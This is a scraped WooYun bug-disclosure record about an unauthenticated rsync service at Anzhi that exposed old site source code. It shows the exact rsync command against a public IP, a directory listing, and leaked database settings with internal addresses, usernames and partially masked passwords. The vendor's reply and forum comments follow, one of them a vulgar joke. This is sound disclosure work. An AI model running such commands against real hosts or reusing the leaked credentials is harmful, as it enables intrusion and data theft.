{"id": 3440, "wybug_id": "wooyun-2014-059688", "wybug_title": "安智网某服务未授权访问 导致安智市场、官网、后台源代码泄露", "wybug_corp": "安智网", "wybug_author": "猪猪侠", "wybug_date": "2014-05-06 17:19", "wybug_open_date": "2014-06-20 17:20", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-20：\t细节向公众公开  简要描述： 安智网某服务未授权访问 导致安智市场、官网、后台源代码泄露，进一步利用可影响到数据安全性 详细说明：  #1 漏洞说明受影响服务器：220.181.167.247受影响服务：RSYNC 未启用身份识别机制，可匿名访问#2 利用说明rsync 220.181.167.247::wwwroot\n[root@localhost ~]# rsync 220.181.167.247::wwwrootdrwxrwxr-x        4096 2013/09/30 16:21:10 .-rw-r--r--           5 2013/09/30 16:21:10 1.txt-rw-r--r--      205825 2010/05/20 16:43:48 200k.jpg-rw-r--r--        6168 2011/06/11 23:41:28 cache_common.php-rw-r--r--           0 2013/07/24 22:52:01 check_sersync-rw-r--r--         526 2011/06/17 23:58:46 index.html-rw-r--r--          17 2011/04/09 20:59:44 info.php-rw-r--r--    12742060 2011/06/23 00:08:29 new-wwwroot.tar.bz2-rwxr-xr-x        7621 2011/06/18 20:32:22 stdafx.php-rw-r--r--          48 2011/04/27 17:38:32 test.phpdrwxr-xr-x        4096 2013/09/30 16:24:03 admin.goapk.comdrwxr-xr-x        4096 2011/03/13 16:32:54 configdrwxr-xr-x        4096 2011/06/30 21:19:40 crondrwxr-xr-x        4096 2011/04/27 18:15:49 datadrwxr-xr-x        4096 2011/03/13 16:32:54 docdrwxr-xr-x        4096 2011/06/27 10:59:57 gomarket.goapk.comdrwxr-xr-x        4096 2011/06/22 13:44:52 market.goapk.comdrwxr-xr-x        4096 2011/05/27 10:21:53 modeldrwxr-xr-x        4096 2011/07/01 10:39:06 new-wwwrootdrwxr-xr-x        4096 2013/11/25 17:33:31 sxydrwxr-xr-x        4096 2011/06/01 15:12:01 toolsdrwxr-xr-x        4096 2010/09/02 17:37:56 viewdrwxr-xr-x        4096 2011/08/16 21:24:50 www.goapk.com\n   漏洞证明：  #3 敏感信息http://admin.goapk.com/info.php # phpinfo#4 某数据库\n$config['db']['master'] = array(\t'type' => 'mysql',\t'host' => '192.168.1.116',\t'port' => '3306',\t'username' => 'market',\t'password' => 'ya3****da0',\t'database' => 'newgomarket',\t'charset' => 'utf8',);$config['db']['slave'] = array(\t'type' => 'mysql',\t'host' => '192.168.1.117',\t'port' => '3306',\t'username' => 'market',\t'password' => 'ya3****a0',\t'database' => 'newgomarket',\t'charset' => 'utf8',);$config['db']['sphinx'] = array(\t'type' => 'sphinx',\t'host' => '192.168.1.81',\t'port' => '9312',);$config['cache']['memcached'] = array(\t'host' => '192.168.1.114',\t'port' => '11211',);$config['cache']['mysql'] = array(\t'dbserver' => 'master',\t'table' => 'cache',\t'key_name' => 'key',\t'value_name' => 'value',);$prefix = (GO_SERVER_IP == \"192.168.0.99\") ? '119.57.50' : '192.168.1';$config['download_log_path'] = array(\t//P_LOG_DIR . \"/\" . 'market.goapk.com' . \"/\". $file,\t//P_LOG_DIR . \"/\" . 'gomarket.goapk.com' . \"/\". $file,\t\"http://${prefix}.114:81/newgomarket.goapk.com/\",\t\"http://${prefix}.115:81/newgomarket.goapk.com/\",\t//\"http://${prefix}.114:81/goapk.yakergong.com/\",\t//\"http://${prefix}.115:81/goapk.yakergong.com/\",\t\"http://${prefix}.114:81/newmarket.goapk.com/\",\t\"http://${prefix}.115:81/newmarket.goapk.com/\",\t\"http://${prefix}.84:81/newmarket.goapk.com/\",\t\"http://${prefix}.84:81/newgomarket.goapk.com/\",\t//\"http://${prefix}.84:81/goapk.yakergong.com/\",\t//\"http://${prefix}.122:81/market.goapk.com/\",\t//\"http://${prefix}.122:81/gomarket.goapk.com/\",\t//\"http://${prefix}.122:81/goapk.yakergong.com/\",);return $config;\n#5 新后台数据库配置http://newadmin.goapk.com/index.php/Public/loginhttp://newadmin.goapk.com/Conf/config.php\n<?phpreturn array(\t//'配置项'=>'配置值'    /* 数据库设置 */    'DB_TYPE'               => 'mysql',     // 数据库类型\t'DB_HOST'               => '192.168.1.116', // 服务器地址\t'DB_NAME'               => 'newgomarket',          // 数据库名\t'DB_PORT'               => 3306,        // 端口\t'DB_PREFIX'             => 'sj_',    // 数据库表前缀\t'DB_SUFFIX'             => '',          // 数据库表后缀    'DB_FIELDTYPE_CHECK'    => false,       // 是否进行字段类型检查    'DB_FIELDS_CACHE'       => false,        // 启用字段缓存    'DB_CHARSET'            => 'utf8',      // 数据库编码默认采用utf8    'DB_DEPLOY_TYPE'        => 0, // 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)    'DB_RW_SEPARATE'        => false,       // 数据库读写是否分离 主从式有效     /* 错误设置 */    'ERROR_MESSAGE' => '您浏览的页面暂时发生了错误！请稍后再试～',//错误显示信息,非调试模式有效    'ERROR_PAGE'    => '',\t// 错误定向页面\t'URL_CASE_INSENSITIVE'  => false,   // URL地址是否不区分大小写    'TOKEN_ON'               =>   true,     // 开启令牌验证    'TOKEN_NAME'             =>   '__hash__',    // 令牌验证的表单隐藏字段名称    'TOKEN_TYPE'             =>    'md5',   // 令牌验证哈希规则\n\n\n   修复方案：  #1 关闭不必要的服务#2 或者加个密码   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-05-07 15:56 厂商回复： 有台机器存放了一些已经废弃的11年的代码，代码属于无运行，非常感谢猪猪侠，我们赶紧再排查一下现网在用的相关代码服务器。 最新状态： 2014-05-07：更新一下，这种问题应该算是比较严重，只是评危害等级低是因为那台服务器的数据影响不大，如果是现网的话，就非常的严重，猪猪侠给我们提了很大的一个醒，非常感谢。  ", "replys": "漏洞评价：\n评论\n     2014-05-06 17:20 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  美！    \n     2014-05-06 17:23 |    \t\tJiuShao \t\t\t( 普通白帽子  |\t\t\t        Rank:405 漏洞数:94        | ╮(╯▽╰)╭锄禾日当午)\t\t \n  赞！    \n     2014-05-06 17:25 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  猪哥休息了20天，又回归了    \n     2014-05-06 17:34 |    \t\t松子 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:5        | 无事)\t\t \n  前排    \n     2014-05-06 17:43 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  洞主身怀绝技啊    \n     2014-05-06 18:04 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  前排支持    \n     2014-05-06 19:02 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  好久不见！    \n     2014-05-06 19:22 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  洞主身怀绝技啊    \n     2014-05-06 19:35 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  你关注的白帽子 猪猪侠 发表了漏洞 安智网某服务未授权访问 导致安智市场、官网、后台源代码泄露    \n     2014-05-06 19:44 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  留名    \n     2014-05-06 19:49 |    \t\tMoc \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | 屌丝何苦为难屌丝)\t\t \n  火速围观    \n     2014-05-06 19:50 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  MARK    \n     2014-05-06 20:41 |    \t\talso \t\t\t( 普通白帽子  |\t\t\t        Rank:424 漏洞数:52        | 招渗透/php/前端/ios&android安全，广州地...)\t\t \n  这个没挖到，找到了注入和几个数据库    \n     2014-05-07 07:49 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  我刚拉来的厂商，猪哥轻点    \n     2014-05-07 09:09 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  BV!    \n     2014-05-07 10:24 |    \t\t安智网(乌云厂商)\t\t \n  已经修复了十分感谢。    \n     2014-05-07 12:03 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  到底是谁强奸了楼主家的母猪呢？楼上？还是楼下？    \n     2014-05-07 12:18 |    \t\t小小鸟 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 小白一个)\t\t \n  表示以前在安智当过一年多的版主。    \n     2014-05-07 12:27 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @安智网 筒子漏洞修复了，但是还得赶紧确认呀。    \n     2014-05-07 16:31 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @安智网 一点数据都没有吗？ 怎么才1分啊。    \n     2014-05-07 18:32 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  目测猪猪侠还会利用这个数据来个连续剧……    \n     2014-05-07 19:07 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @猪猪侠 你这是第一次收到1rank吗？    \n     2014-05-07 23:07 |    \t\tsolihat \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | white hat,webapp security)\t\t \n  rsync?    \n     2014-05-08 16:14 |    \t\t小人物Reno \t\t\t( 普通白帽子  |\t\t\t        Rank:471 漏洞数:110        | X)\t\t \n  哈哈，我也来一发！ @安智网    \n     2014-05-08 18:12 |    \t\t安智网(乌云厂商)\t\t \n  @猪猪侠，乌云第一次使用，猪猪侠请见谅。1个RANK    \n     2014-05-08 18:22 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @安智网 嗯，没事，下一个给高一点就好了。    \n     2014-05-08 19:49 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  没事，下面20个给高一点就好了。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}